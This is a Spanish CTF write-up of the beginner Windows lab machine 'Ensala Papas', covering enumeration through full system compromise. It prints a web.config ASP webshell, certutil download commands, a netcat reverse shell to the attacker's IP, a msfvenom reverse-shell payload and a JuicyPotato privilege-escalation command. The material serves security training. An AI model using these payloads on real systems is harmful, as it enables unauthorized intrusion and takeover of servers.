---
title: "Writeup [Ensala papas] - TheHackerLabs"
date: 2024-07-02 10:00:00 +0200
categories: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
tags: [CTF, Writeups, TheHackerLabs, Linux, Principiante]
image: /img/posts/CTF/ensala/logo.png
---



## Introducción

Hoy vamos a realizar el desafío de la máquina CTF llamada **Ensala Papas** en TheHackersLabs. Este es un reto de nivel principiante que opera bajo un sistema Linux. **Tengo un aprecio especial por esta máquina** ya que me enfrenté a muchos obstáculos durante el proceso y logré superarlos con éxito.

A lo largo de este viaje, recibí **consejos valiosos de la comunidad**, y justo cuando estaba a punto de darla por perdida, decidí darme un margen de dos días. Después de este breve descanso, me puse de nuevo con el desafío y logré resolverlo. Por eso, este writeup me hace especial ilusión compartirlo.

Este análisis no solo refleja la solución al reto, sino también los **innumerables quebraderos de cabeza** que enfrenté y cómo los superé. Este tipo de experiencias a menudo se omiten en los writeups convencionales, que suelen centrarse únicamente en las soluciones. Aquí, sin embargo, quiero destacar tanto los desafíos como las victorias. Para más detalles sobre estos desafíos, véase la sección [Conclusiones](#conclusiones).


### Escaneo de Red con `arp-scan`

Para iniciar nuestro análisis, ejecutamos el siguiente comando en la terminal:

```bash
arp-scan -I enp0s17 --localnet
```

### ¿Qué hace este comando?
`arp-scan` es una herramienta que utiliza el protocolo ARP (Address Resolution Protocol) para identificar dispositivos activos en una red local. El parámetro `-I enp0s17` especifica la interfaz de red a utilizar, en este caso `enp0s17`. El argumento `--localnet` le indica a arp-scan que escanee todos los hosts en la subred local asociada con esa interfaz.

Resultados del escaneo:
```m

Interface: enp0s17, type: EN10MB, MAC: 08:00:27:bd:21:e7, IPv4: 10.0.2.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)

192.168.1.49    08:00:27:f4:9b:0a    (Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 3.085 seconds (82.98 hosts/sec). 4 responded
```


### Interpretación de los resultados:

1. La herramienta escaneó un total de 256 hosts en la red local y tardó 3.085 segundos para completar el proceso, lo que resulta en una velocidad de 82.98 hosts por segundo.
2. De los 256 hosts escaneados, 4 respondieron al escaneo. Esto indica que hay 4 dispositivos activos en la red.
3. La línea 192.168.1.49 08:00:27:f4:9b:0a (Unknown) muestra la dirección IP y la dirección MAC de uno de los dispositivos que respondieron. El término (Unknown) indica que no se pudo identificar el fabricante del dispositivo a partir de su dirección MAC.

[En este post ](/posts/consiguiendo-la-ip-victima-CTF/) explico como averiguar la IP de la maquina Victima. En este escaneo, solo muestro los datos que nos interesan.
Este escaneo inicial nos proporciona una visión general de los dispositivos activos en la red, lo que es un punto de partida crucial para nuestro análisis más detallado.

### Detalles del Escaneo con Script Personalizado

Con la dirección IP obtenida del escaneo anterior, procedemos a ejecutar un script de escaneo que habíamos creado y discutido en un post anterior ([Ver post de escaneo con nmap](/posts/scan-nmap/)). El comando utilizado es el siguiente:

```bash
sudo ./escaneo.sh 192.168.1.49
```

Este script escaneo.sh está diseñado para automatizar el uso de nmap, una herramienta poderosa para la exploración de redes y la auditoría de seguridad. El script realiza un escaneo detallado de los puertos abiertos, servicios en ejecución y posibles vulnerabilidades asociadas con la dirección IP especificada.

**Resultado del escaneo detallado:**

```m
❯ cat detailed_scan_192.168.1.49.txt -l java


     │ File: detailed_scan_192.168.1.49.txt
     │ # Nmap 7.94SVN scan initiated Mon Jul  1 13:28:14 2024 as: nmap -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 -sCV -oN detailed_scan_192.168.1.49.txt 192.168.1.49
     │ Nmap scan report for 192.168.1.49
     │ Host is up (0.0015s latency).
     │ 
     │ PORT      STATE SERVICE       VERSION
     │ 80/tcp    open  http          Microsoft IIS httpd 7.5
     │ | http-methods: 
     │ |_  Potentially risky methods: TRACE
     │ |_http-server-header: Microsoft-IIS/7.5
     │ |_http-title: IIS7
     │ 135/tcp   open  msrpc         Microsoft Windows RPC
     │ 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
     │ 445/tcp   open  microsoft-ds?
     │ 47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
     │ |_http-server-header: Microsoft-HTTPAPI/2.0
     │ |_http-title: Not Found
     │ 49152/tcp open  msrpc         Microsoft Windows RPC
     │ 49153/tcp open  msrpc         Microsoft Windows RPC
     │ 49154/tcp open  msrpc         Microsoft Windows RPC
     │ 49155/tcp open  msrpc         Microsoft Windows RPC
     │ 49156/tcp open  msrpc         Microsoft Windows RPC
     │ 49157/tcp open  msrpc         Microsoft Windows RPC
     │ MAC Address: 08:00:27:F4:9B:0A (Oracle VirtualBox virtual NIC)
     │ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
     │ 
     │ Host script results:
     │ | smb2-time: 
     │ |   date: 2024-07-01T11:30:49
     │ |_  start_date: 2024-07-01T10:33:56
     │ |_nbstat: NetBIOS name: WIN-4QU3QNHNK7E, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f4:9b:0a (Oracle VirtualBox virtual NIC)
     │ |_clock-skew: 1m35s
     │ | smb2-security-mode: 
     │ |   2:1:0: 
     │ |_    Message signing enabled but not required
     │ 
     │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     │ # Nmap done at Mon Jul  1 13:29:18 2024 -- 1 IP address (1 host up) scanned in 64.44 seconds
```

**Interpretación de los resultados:**

1. El servicio HTTP en el puerto 80 está ejecutando Microsoft IIS 7.5, lo que puede ser susceptible a vulnerabilidades conocidas, especialmente con métodos como TRACE habilitados.
2. Los puertos asociados con Microsoft Windows RPC y NetBIOS sugieren que el host es una máquina Windows, lo cual es corroborado por la información de la MAC y los servicios reportados.
3. La existencia de múltiples puertos abiertos relacionados con Microsoft RPC indica un ambiente típico de una red de Windows que puede necesitar más configuraciones de seguridad para proteger contra accesos remotos no autorizados.

**Evaluación de Vulnerabilidades con nmap**
Adicionalmente, realizamos un escaneo de vulnerabilidades en los mismos puertos para identificar posibles debilidades explotables:
```m
❯ cat vuln_scan_192.168.1.49.txt -l java


     │ File: vuln_scan_192.168.1.49.txt
     │ # Nmap 7.94SVN scan initiated Mon Jul  1 13:29:19 2024 as: nmap -p80,135,139,445,47001,49152,49153,49154,49155,49156,49157 --script vuln -oN vuln_scan_192.168.1.49.txt 192.168.1.49
     │ Nmap scan report for 192.168.1.49
     │ Host is up (0.0015s latency).
     │ 
     │ PORT      STATE SERVICE
     │ 80/tcp    open  http
     │ |_http-csrf: Couldn't find any CSRF vulnerabilities.
     │ |_http-dombased-xss: Couldn't find any DOM based XSS.
     │ |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
     │ 135/tcp   open  msrpc
     │ 139/tcp   open  netbios-ssn
     │ 445/tcp   open  microsoft-ds
     │ 47001/tcp open  winrm
     │ 49152/tcp open  unknown
     │ 49153/tcp open  unknown
     │ 49154/tcp open  unknown
     │ 49155/tcp open  unknown
     │ 49156/tcp open  unknown
     │ 49157/tcp open  unknown
     │ MAC Address: 08:00:27:F4:9B:0A (Oracle VirtualBox virtual NIC)
     │ 
     │ Host script results:
     │ |_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
     │ |_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
     │ |_smb-vuln-ms10-054: false
     │ 
     │ # Nmap done at Mon Jul  1 13:31:51 2024 -- 1 IP address (1 host up) scanned in 152.38 seconds
```
**Análisis de los resultados del escaneo de vulnerabilidades:**

1. No se encontraron vulnerabilidades XSS o CSRF en el puerto 80. Esto sugiere que aunque el servicio HTTP está activo, no se detectaron vulnerabilidades inmediatas en las pruebas realizadas.
2. Los intentos de identificar vulnerabilidades SMB críticas fallaron debido a problemas de conexión, lo que podría requerir un análisis más profundo para asegurar que estos servicios no sean explotables.

Estos resultados nos proporcionan una visión clara sobre la postura de seguridad del dispositivo y nos ayudan a planificar los siguientes pasos en nuestra evaluación de seguridad.



### Conclusión de la Fase Inicial

Tras realizar un escaneo exhaustivo y una evaluación detallada de vulnerabilidades en el dispositivo con IP 192.168.1.49, aún no hemos obtenido información concluyente que nos indique vulnerabilidades claras o configuraciones críticamente mal gestionadas. Sin embargo, la presencia del servicio Microsoft IIS httpd 7.5 en el puerto 80 resalta como un punto crítico potencial debido a su relevancia en la infraestructura y los conocidos riesgos asociados.

**¿Por qué enfocarnos en IIS?**

El servidor IIS (Internet Information Services) es ampliamente utilizado y, por lo tanto, un objetivo frecuente de ataques. A pesar de que la versión 7.5 es conocida por su estabilidad, históricamente ha presentado múltiples vulnerabilidades que podrían ser explotadas por un atacante para obtener acceso no autorizado o causar daños. Dado que nuestro análisis inicial no reveló problemas inmediatos, vamos a profundizar en el estudio del IIS para determinar si hay fallas de seguridad que no fueron evidentes en los escaneos automáticos.

Este enfoque nos permitirá investigar a fondo y explorar posibles debilidades que no fueron detectadas inicialmente, proporcionando una base más sólida para mejorar la seguridad de la infraestructura evaluada. En las siguientes secciones, detallaremos cada paso de este proceso y los hallazgos que esperamos descubrir al analizar más profundamente el servidor IIS.


**Plan de acción:**
- **Investigación Profunda:** Vamos a profundizar en la configuración del IIS para identificar configuraciones inseguras, parches faltantes o cualquier error de configuración que podría ser explotado.
- **Pruebas Específicas:** Utilizaremos herramientas especializadas para probar vulnerabilidades conocidas y evaluar la resistencia del IIS frente a ataques comunes como XSS, inyecciones SQL y otros ataques web.


## Detección y Análisis de Vulnerabilidades

A medida que profundizamos en nuestro análisis de seguridad, es crucial identificar y entender las vulnerabilidades que podrían ser explotadas por atacantes. Esta sección se dedica a la detección sistemática de vulnerabilidades en los sistemas y servicios identificados durante la fase inicial de escaneo. Nuestro objetivo es evaluar no solo los componentes obvios como el servidor IIS, sino también cualquier otro servicio o configuración que pueda presentar riesgos.

### Metodología

Para asegurarnos de que nuestra investigación es exhaustiva, utilizaremos una combinación de herramientas automáticas y chequeos manuales para detectar vulnerabilidades. Las herramientas como Nmap y sus scripts de vulnerabilidad nos ofrecen un buen punto de partida. Además, exploraremos el uso de otras herramientas especializadas según sea necesario, basadas en los servicios que estamos investigando.

### Esperado de esta sección

1. **Resultados de Herramientas Automatizadas**: Detalles de cualquier vulnerabilidad detectada por las herramientas de escaneo.
2. **Análisis Manual**: Observaciones de configuraciones inseguras o prácticas de seguridad deficientes que no se detectan fácilmente con herramientas automáticas.
3. **Recomendaciones Preliminares**: Sugerencias para mitigar las vulnerabilidades identificadas, preparando el terreno para una acción correctiva detallada en las conclusiones del writeup.

### Exploración con Gobuster

Para profundizar en la búsqueda de directorios y archivos ocultos o no documentados en el servidor, utilizamos la herramienta Gobuster. Este software realiza una búsqueda de fuerza bruta para encontrar directorios y archivos basándose en nombres de rutas comunes desde una lista de palabras. El comando específico que empleamos es el siguiente:

```bash
gobuster dir -u http://192.168.1.49 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x asp,aspx,html,php,sql,ini
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.49
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              asp,aspx,html,php,sql,ini
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*.aspx      (Status: 400) [Size: 20]
/zoc.aspx             (Status: 200) [Size: 1159]
/*docroot*.aspx       (Status: 400) [Size: 20]
/*.aspx               (Status: 400) [Size: 20]
/http%3A%2F%2Fwww.aspx (Status: 400) [Size: 20]
/http%3A.aspx         (Status: 400) [Size: 20]
/q%26a.aspx           (Status: 400) [Size: 20]
/**http%3a.aspx       (Status: 400) [Size: 20]
```



**Detalles del comando:**

* -u http://192.168.1.49: URL del servidor a analizar.
* -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt: Especifica la lista de palabras utilizada para la enumeración de directorios.
* -x asp,aspx,html,php,sql,ini: Lista de extensiones a probar durante el escaneo, permitiendo identificar archivos con estas extensiones.

**Resultados de Gobuster:**

Durante el escaneo, Gobuster identificó varios archivos y rutas que requerirán una inspección más detallada:

/zoc.aspx (Status: 200) [Size: 1159]: Un archivo accesible públicamente que necesitaremos examinar más de cerca.
Varios intentos de acceso a otros archivos como /*checkout*.aspx, /*docroot*.aspx, y /*.aspx resultaron en un estado HTTP 400, indicando que estos patrones pueden estar bloqueados o no permitidos en el servidor.






### Análisis del Archivo `/zoc.aspx`

Al visitar la dirección `http://192.168.1.49/zoc.aspx`, nos encontramos con un formulario destinado para la subida de archivos. Este es un punto crítico para revisar, ya que los formularios de carga de archivos pueden ser explotados si no están adecuadamente asegurados.

### Código Fuente del Formulario

El código fuente del formulario no muestra irregularidades evidentes a primera vista, pero es esencial inspeccionar cada elemento para asegurarse de que no existen fallos de seguridad. A continuación, se presenta el código fuente de la página, con un enfoque en las partes más críticas que requieren revisión:

```html
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>Secure File Transfer</title>
</head>
<body>
    <form name="form1" method="post" action="zoc.aspx" enctype="multipart/form-data">
        <div>
            <input type="hidden" name="__VIEWSTATE" value="..."/>
            <input type="hidden" name="__EVENTVALIDATION" value="..."/>
        </div>
        <div>
            <input type="file" name="FileUpload1" id="FileUpload1" />
            <input type="submit" name="btnUpload" value="Upload" onclick="return ValidateFile();"/>
            <br />
            <span id="Label1"></span>
        </div>
    </form>
</body>
</html>

<!-- /Subiditosdetono -->
```

**Elementos Clave:**

1. Formulario de Subida: Permite a los usuarios subir archivos, lo cual es una potencial entrada para archivos malintencionados si no existen controles adecuados.
2. Validación del Cliente: La llamada a ValidateFile(); indica que hay validación en el lado del cliente, pero este tipo de validación puede ser insuficiente ya que puede ser fácilmente evadida por un atacante.
3. Comentario del Código: El comentario <!-- /Subiditosdetono --> al final del documento es intrigante. Podría ser simplemente un comentario dejado por un desarrollador, o podría indicar algo más, como un directorio oculto o una pista sobre la funcionalidad del servidor que requiere exploración adicional.
![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/zocaspx.png>) 
![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/403.png>) 






### Utilizando Recursos Externos para Explotar Vulnerabilidades en IIS

Recientemente, un compañero de la comunidad me compartió un **valioso consejo**: **"HackTricks es tu amigo"**. Inspirado por esta recomendación, decidí utilizar "HackTricks" como una fuente de referencia rápida para identificar vulnerabilidades comunes y técnicas de explotación específicas para servidores IIS. Este recurso se ha convertido en un punto de partida esencial para muchos profesionales de la Ciberseguridad. Mi búsqueda me llevó a una página que resultó ser particularmente útil:

[HackTricks - Pentesting IIS Internet Information Services](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/iis-internet-information-services)


### Técnica de Explotación Sugerida

La documentación en HackTricks sugiere que una forma efectiva de explotar IIS es a través de la subida y manipulación de archivos `web.config`. Este archivo es crucial en aplicaciones basadas en IIS, ya que dicta la configuración del servidor y puede ser utilizado para ejecutar código arbitrario si se configura de manera insegura.

### Preparación del Archivo `web.config`

Siguiendo un enlace proporcionado por HackTricks, encontré un `web.config` ya preparado en el repositorio de GitHub "PayloadsAllTheThings", que está diseñado para probar la seguridad de subida de archivos en servidores IIS:

[web.config en PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

```m
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!--
<% Response.write("-"&"->")%>
<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>

```



Descargamos el archivo y procedimos con el siguiente paso: la subida del archivo al servidor a través del formulario encontrado en `/zoc.aspx`.

### Subida del Archivo y Resultados

Usamos el formulario para subir el archivo `web.config` y, aparentemente, la carga se realizó con éxito. Sin embargo, no se proporcionaron indicaciones claras sobre dónde el archivo fue almacenado en el servidor. Esto nos obliga a realizar una investigación adicional para localizar el archivo y verificar si la subida ha tenido algún efecto en la configuración del servidor.


![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/ping.png>) 

### Exploración del Directorio Sugerido

El comentario en el HTML de `/zoc.aspx` señaló un directorio restringido: `<!-- /Subiditosdetono -->`. Para probar la seguridad y accesibilidad, decidimos acceder directamente al fichero que podría ser crucial en este directorio: `http://192.168.1.49/Subiditosdetono/web.config`. Este intento nos permitirá evaluar si el archivo `web.config` ha sido correctamente configurado y si el directorio está protegido adecuadamente.



### Webshell en IIS: ¡Hora de Jugar!

¡Éxito! Hemos logrado establecer un webshell en el servidor IIS. Ahora es momento de explorar más y ver hasta dónde podemos llegar. ¡Vamos a jugar un poco! 😄

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/dentro.png>) 



### Explotación de Vulnerabilidades

Ahora que hemos identificado y analizado las vulnerabilidades presentes en el servidor, es el momento de pasar a la fase de explotación. En esta sección, demostraremos cómo estas vulnerabilidades pueden ser aprovechadas para ganar acceso adicional al sistema o para exponer datos sensibles. Nuestro objetivo es no solo probar la efectividad de los posibles vectores de ataque, sino también proporcionar las bases para las futuras mitigaciones de seguridad necesarias.

### Validación de la Conectividad y Preparación de Herramientas

Una vez establecido el webshell en el servidor IIS, procedimos a validar la conectividad entre nuestro sistema y el servidor comprometido. Utilizamos el comando `ping` para asegurarnos de que podemos comunicarnos eficazmente con nuestra máquina local.

### Comprobación de Conectividad

Desde la interfaz del webshell, ejecutamos el siguiente comando para realizar un ping a nuestra máquina:

```bash
ping -n 2 192.168.1.47
```

La máquina respondió satisfactoriamente, confirmándonos que existe una comunicación bidireccional entre el servidor y nuestro sistema local.


![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/image.png>) 

### Configuración de Netcat para Acceso Remoto

Con la conectividad confirmada, procedimos a establecer un método más robusto para interactuar con el servidor. Para esto, optamos por utilizar Netcat, una herramienta versátil para manejar conexiones de red.

1. **Transferencia de Netcat al Servidor:** Descargamos nc.exe de un recurso confiable y lo almacenamos en una ubicación accesible en nuestro sistema local.

2. **Servidor Web Python para Transferencia de Archivos:**

Para transferir nc.exe al servidor comprometido, configuramos un servidor web simple utilizando Python en nuestro sistema local, que nos permitirá servir el archivo directamente al servidor IIS:

```bash
python3 -m http.server 80
```
Este servidor web se ejecuta en el puerto 80, lo cual es ideal para situaciones donde otros puertos más comunes para transferencias, como el 21 (FTP) o el 22 (SSH), pueden estar bloqueados.

### Preparación del Entorno de Trabajo en el Servidor

Para facilitar la administración de las herramientas que utilizaremos en la explotación, decidimos crear un directorio específico desde el cual operar. Esto nos ayuda a mantener organizadas nuestras operaciones y asegura que todos los archivos necesarios estén en un lugar conocido y accesible.

### Creación de un Directorio de Trabajo

Desde la webshell, ejecutamos el siguiente comando para crear un directorio en la unidad C del servidor:

```bash
mkdir c:\temp
```

### Descarga de Netcat al Servidor

Con el directorio establecido, el siguiente paso fue transferir nc.exe al servidor para permitir una interacción más compleja y controlada. Utilizamos `certutil`, una herramienta incluida en Windows, para descargar Netcat desde nuestro servidor web local directamente al directorio que acabamos de crear:

```bash
certutil -split -urlcache -f http://192.168.1.47:80/nc.exe c:\temp\nc.exe
```

Este método asegura que podemos transferir archivos de manera segura y efectiva, incluso cuando métodos más tradicionales de transferencia de archivos no están disponibles o son demasiado riesgosos de usar en un entorno comprometido.

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/uploadcertutil.png>) 

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/dirctemp.png>) 


### Establecimiento una Reverse Shell con Netcat

Con `nc.exe` ya en su lugar en el servidor, procedimos a configurar una Reverse Shell, lo que nos proporcionaría acceso interactivo al servidor comprometido. 

### Configuración del Listener

Primero, configuramos un listener en nuestra propia máquina para estar listos para aceptar la conexión entrante desde el servidor comprometido. Esto se hizo utilizando el siguiente comando en Netcat:

```bash
nc -lnvp 443
```

Este comando pone nuestra máquina a la escucha en el puerto 443, esperando conexiones entrantes.

### Ejecución de Netcat en el Servidor
Con el listener activo, utilizamos la webshell para iniciar Netcat en el servidor, configurado para abrir una shell inversa hacia nuestra máquina:

```bash
c:\temp\nc.exe -e cmd 192.168.1.47 443
```

Este comando ejecuta nc.exe desde el directorio c:\temp, utilizando la opción -e para ejecutar cmd, lo que establece una sesión de comando directa con nuestra máquina a través del puerto 443.


![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/ncexecmd.png>) 

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/ncok.png>) 



### Acceso Conseguido Mediante Reverse Shell

¡Hemos logrado un hito importante! Conseguimos acceso al servidor a través de una reverse shell, lo que nos permite interactuar directamente con el sistema comprometido. Este logro marca un avance significativo en nuestra evaluación de seguridad.

### Próximos Pasos

Nuestro objetivo final es alcanzar permisos de administrador para tener control total sobre el sistema. Para ello, vamos a detener temporalmente el proceso actual y prepararnos para utilizar técnicas avanzadas de escalada de privilegios.

Exploraremos el uso de JuicyPotato, una conocida herramienta de escalada de privilegios, junto con payloads generados por msfvenom. Estas herramientas nos permitirán configurar una reverse shell más potente y obtener permisos de administrador en el sistema comprometido.


## Conquistando Root: La Última Frontera


Nos preparamos para el paso decisivo: obtener privilegios de administrador utilizando `JuicyPotato` y payloads de `msfvenom`. Este método nos permitirá ejecutar comandos con privilegios elevados y tomar control completo del sistema.

### Implementación de JuicyPotato

Para llevar a cabo la escalada de privilegios en el sistema objetivo, comenzamos descargando la herramienta JuicyPotato desde su repositorio oficial:

```bash
sudo wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

Este archivo es esencial para nuestra estrategia de elevación de privilegios, ya que JuicyPotato permite explotar la vulnerabilidad de impersonación de tokens en sistemas Windows.

### Configuración del Payload
Una vez que tenemos JuicyPotato en nuestra máquina, procedemos a crear el payload que será ejecutado por el exploit. Para esto, usamos msfvenom para generar un shell reverso que nos conectará de regreso a nuestra máquina. **Es crucial configurar correctamente la dirección IP (LHOST) y el puerto (LPORT) a los que el sistema comprometido deberá conectarse:**

```m
sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.47 LPORT=8899 -f exe -o shell.exe
```

Con estos comandos, generamos un archivo ejecutable (shell.exe) que, cuando se ejecute en el sistema objetivo, intentará establecer una conexión inversa hacia la IP y el puerto especificados.

```bash
ls
 JuicyPotato.exe    shell.exe
```

### Preparación y Transferencia de JuicyPotato al Servidor Comprometido

Para facilitar la transferencia de `JuicyPotato.exe` al servidor comprometido, primero habilitamos un servidor web en nuestra máquina local utilizando Python. Esto nos permite servir los archivos necesarios directamente al servidor objetivo:

```bash
python3 -m http.server 80
```

### Descarga de JuicyPotato en el Servidor
Con nuestro servidor web en funcionamiento, utilizamos la webshell del servidor comprometido para descargar JuicyPotato.exe directamente a nuestra ubicacion c:\temp\   Para esto, empleamos certutil.

Verificamos la descarga, y está todo correcto!

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/juicytemp.png>) 


### Estableciendo la Escucha para la Conexión Inversa

Con todo en su lugar, el último paso antes de ejecutar el exploit es asegurarnos de que estamos listos para recibir la conexión inversa del servidor. Esto se hace estableciendo oyentes en los puertos que hemos especificado anteriormente.

#### Configuración del Listener Principal

Primero, configuramos nuestro sistema para escuchar en el puerto **8899**, que es el puerto especificado en el payload de `msfvenom` para la conexión inversa. Utilizamos Netcat para esta tarea, dado su facilidad de uso y fiabilidad para tales propósitos:

```bash
nc -lnvp 8899
```

Esto garantiza que estemos preparados para cualquier conexión adicional o alternativa que el servidor comprometido pueda intentar.

### Ejecución y Monitoreo
Con los listeners activos, estamos listos para ejecutar el comando en el servidor que iniciará la Reverse shell. Monitoreamos nuestras terminales de escucha para captar cualquier actividad entrante, lo cual indicará que nuestro exploit ha sido exitoso.

![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/penultima.png>) 
![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/nc8899.png>) 




Una vez establecida la reverse shell, procedemos con la ejecución de `JuicyPotato.exe` para completar la escalada de privilegios. Esto nos permite explotar una vulnerabilidad en el servicio de impersonación de Windows para obtener privilegios de administrador.

#### Comando de Ejecución de JuicyPotato

Ejecutamos `JuicyPotato.exe`  con los siguientes parámetros:

```bash
JuicyPotato.exe -l 443 -t * -p shell.exe -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"
```
**Descripción de los Parámetros:**

1. -l 443: Especifica el puerto local en el que JuicyPotato escuchará para la retransmisión de tokens. Utilizamos el puerto 443, que generalmente es para HTTPS, por lo que es menos probable que sea bloqueado por firewalls.
2. -t *: Esta opción indica que JuicyPotato intentará cualquier token disponible, lo cual maximiza las posibilidades de éxito.
3. -p shell.exe: Define el camino al ejecutable (shell.exe) que JuicyPotato debe ejecutar una vez que ha conseguido elevar los privilegios.
4. -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}": Este es el CLSID del servicio COM que utilizaremos para la explotación, que debe ser válido y vulnerable en la versión del sistema operativo del objetivo.


## Somos root

¡Lo hemos logrado! Hemos obtenido privilegios de administrador en el sistema comprometido, un logro que no solo demuestra la eficacia de nuestras técnicas sino también la importancia de la seguridad proactiva y las pruebas de penetración.


![Imagen del mensaje 'source' en index.html](</img/posts/CTF/ensala/somosroot.png>) 


```bash
c:\Users\Administrador\Desktop>type root.txt
j**34**f**3*****************************:D
```


## Conclusiones

### Reflexiones sobre el Proceso de Aprendizaje

Este writeup ha sido más que solo una guía paso a paso para explotar una máquina; ha sido una jornada de aprendizaje y perseverancia. A pesar de ser catalogada como una máquina de nivel fácil, este desafío me llevó al límite y requirió días de esfuerzo. No siempre fue un proceso directo; hubo momentos de frustración y errores, pero cada uno de estos momentos fue una oportunidad para aprender y mejorar.

- **Persistencia y Aprendizaje**: Estoy particularmente orgulloso de no haberme rendido. A través de este desafío, he aprendido enormemente, no solo sobre técnicas específicas de hacking, sino también sobre cómo enfrentar y superar obstáculos. Finalmente, logré vulnerar el sistema de múltiples maneras, lo cual fue increíblemente gratificante.

### Consejos para Superar Obstáculos

- **Cuando las Cosas se Ponen Difíciles**: Es normal sentirse atascado o pensar que no estás progresando. En esos momentos, es crucial recordar que está bien tomarse un descanso. Sal a caminar, despeja tu mente, y vuelve a intentarlo más tarde o incluso otro día. A veces, una pausa puede ofrecer una nueva perspectiva y revitalizar tu enfoque.

- **Aprender de Otros**: No dudes en consultar writeups de otras máquinas, especialmente si te sientes bloqueado. Estas pueden ofrecer insights y técnicas que quizás no habías considerado. También es una excelente manera de aprender y adaptar enfoques que otros han encontrado útiles.

### Uso de Herramientas y Recursos

- **ChatGPT y Obsidian**: Este writeup fue asistido por ChatGPT, que ha sido una herramienta invaluable para aclarar dudas y guiar algunos de los procesos técnicos. Sin embargo, mi primera línea de defensa siempre son mis propios apuntes en Obsidian. He construido una base de conocimiento personal que continuamente amplío y refino. Solo recurro a herramientas externas cuando mis propios recursos no son suficientes, asegurando que cada nueva pieza de conocimiento sea bien entendida y almacenada para uso futuro.

### Cierre

En conclusión, más allá de las habilidades técnicas, este desafío me enseñó sobre la importancia de la resiliencia y la autogestión en el aprendizaje continuo. La seguridad informática es un campo dinámico que requiere tanto la capacidad de adaptarse rápidamente a nuevas informaciones como la tenacidad para seguir intentándolo frente a desafíos aparentemente insuperables. Espero que este writeup inspire a otros a perseguir sus objetivos en ciberseguridad


